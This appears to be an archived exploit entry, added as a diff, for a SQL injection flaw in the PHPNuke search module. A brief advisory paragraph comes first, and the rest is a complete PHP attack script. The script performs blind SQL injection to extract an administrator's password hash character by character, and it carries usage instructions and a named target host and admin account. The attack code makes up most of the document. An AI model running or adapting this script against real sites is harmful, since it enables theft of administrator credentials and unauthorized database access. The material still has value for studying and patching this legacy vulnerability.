@@ -1,0 +1,92 @@
+source: http://www.securityfocus.com/bid/6887/info
+
+
+It has been reported that the search module distributed with PHPNuke is vulnerable to an SQL injection attack.
+
+PHPNuke, in some cases, does not sufficiently sanitize user-supplied input which is used when constructing SQL queries. As a result, attackers may supply malicious parameters to manipulate the structure and logic of SQL queries. This may result in unauthorized operations being performed on the underlying database. This issue may be exploited to cause sensitive information to be disclosed to a remote attacker. 
+
+<?php
+
+########## PHPnuke Auto-SelectFish Attacker
+########## David@cgishield.com
+########## works on phpnuke 5.6 and 6.0
+
+// To use this program, simply upload it to a php enabled webserver, and execute
+// If php times out before the whole password hash is determined, 
+// adjust the maximum script execution time in php.ini
+// Also, replace following with correct values:
+
+$server="www.phpnuke.org";
+$script="/modules.php";
+
+// Title of a story created specifically by the admin who is being hacked.
+$data_to_match="Revolution";
+$admin_account_name="nukelite";
+$beginchar="1";
+$endchar="33";
+
+
+
+$admin_account_name=urlencode($admin_account_name);
+$data_to_match=urlencode($data_to_match);
+
+$checkchar[0]="char(48)";
+$checkchar[1]="char(49)";
+$checkchar[2]="char(50)";
+$checkchar[3]="char(51)";
+$checkchar[4]="char(52)";
+$checkchar[5]="char(53)";
+$checkchar[6]="char(54)";
+$checkchar[7]="char(55)";
+$checkchar[8]="char(56)";
+$checkchar[9]="char(57)";
+$checkchar[a]="char(97)";
+$checkchar[b]="char(98)";
+$checkchar[c]="char(99)";
+$checkchar[d]="char(100)";
+$checkchar[e]="char(101)";
+$checkchar[f]="char(102)";
+
+for($i=$beginchar;$i<$endchar;$i++){
+reset($checkchar);
+while (list($i2, $i2val) = @each($checkchar)){
+
+$vars="name=Search&query=$data_to_match&topic=&category=&author=$admin_account_name&days=1000+and+mid(a.pwd,$i,1)=$checkchar[$i2]&type=stories";
+$data=sendToHost("$server",'post',"$script","$vars");
+
+if (eregi("No matches found to your query","$data")){
+
+}
+else{
+
+echo("<br>$i= $i2"); flush();break;}
+
+}
+
+}
+
+
+function sendToHost($host,$method,$path,$data,$useragent=1)
+{
+$method = strtoupper($method);
+$fp = fsockopen($host,80);
+fputs($fp, "$method $path HTTP/1.1\n");
+fputs($fp, "Host: $host\n");
+fputs($fp, "Content-type: application/x-www-form-urlencoded\n");
+fputs($fp, "Content-length: " . strlen($data) . "\n");
+if ($useragent)
+fputs($fp, "User-Agent: Mozilla\n");
+fputs($fp, "Connection: close\n\n");
+if ($method == 'POST')
+fputs($fp, $data);
+while (!feof($fp))
+$buf .= fgets($fp,128);
+fclose($fp);
+for($slow=0;$slow<100;$slow++){}
+
+return $buf;
+}
+
+
+?>
+
